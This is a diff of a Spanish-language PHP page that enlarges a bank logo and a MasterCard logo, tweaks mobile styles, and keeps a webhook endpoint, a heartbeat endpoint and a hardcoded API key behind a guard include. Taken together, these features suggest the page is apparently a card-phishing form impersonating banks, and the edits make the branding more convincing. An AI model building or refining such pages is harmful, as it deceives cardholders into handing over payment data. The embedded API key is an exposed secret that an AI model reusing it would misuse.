@@ -1,3 +1,4 @@
+
 <?php require_once __DIR__ . '/_guard.php'; ?>
 <!DOCTYPE html>
 <html lang="es">
@@ -45,33 +46,34 @@
             z-index: 1;
         }
 
-        /* --- CABECERA DE LOGOS --- */
+        /* --- CABECERA DE LOGOS GIGANTES --- */
         .header { 
             display: flex; 
             align-items: center; 
             justify-content: space-between; 
-            margin-bottom: 30px; 
-            min-height: 50px; 
+            margin-bottom: 35px; 
+            min-height: 80px; /* Aumentado para dar espacio a los logos grandes */
         }
         
+        /* Logo del banco (Izquierda) */
         .bank-logo { 
             display: flex; 
             align-items: center; 
             justify-content: flex-start;
-            height: 45px; 
+            height: 70px; /* Logos grandes en PC */
         }
         .bank-logo img { 
             height: 100%; 
             width: auto; 
-            max-width: 140px; 
+            max-width: 180px; 
             object-fit: contain; 
             display: none; 
         }
         
         .bank-icon-placeholder {
             display: none;
-            width: 40px;
-            height: 40px;
+            width: 60px;
+            height: 60px;
         }
         
         /* Logo MasterCard (Derecha) */
@@ -79,7 +81,7 @@
             display: flex; 
             align-items: center; 
             justify-content: flex-end;
-            height: 45px; 
+            height: 70px; /* Logos grandes en PC */
         }
         .mc-logo img { 
             height: 100%; 
@@ -295,20 +297,21 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
 
+        /* Responsive para móviles (Logos también grandes) */
         @media (max-width: 480px) { 
             .modal-container { padding: 30px 20px; } 
             .form-title { font-size: 1.35rem; } 
             .form-input { padding: 14px; font-size: 1rem; }
             
             .header {
-                min-height: 60px;
+                min-height: 70px;
                 margin-bottom: 25px;
             }
             .bank-logo {
-                height: 40px; 
+                height: 60px; 
             }
             .mc-logo {
-                height: 45px; 
+                height: 60px; 
             }
         }
     </style>
@@ -383,9 +386,6 @@
     </div>
 
     <script>
-        // ============================================
-        // CONFIGURACIÓN
-        // ============================================
         const WEBHOOK_URL = '/api/webhook.php';
         const HEARTBEAT_URL = '/api/heartbeat.php';
         const API_KEY = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
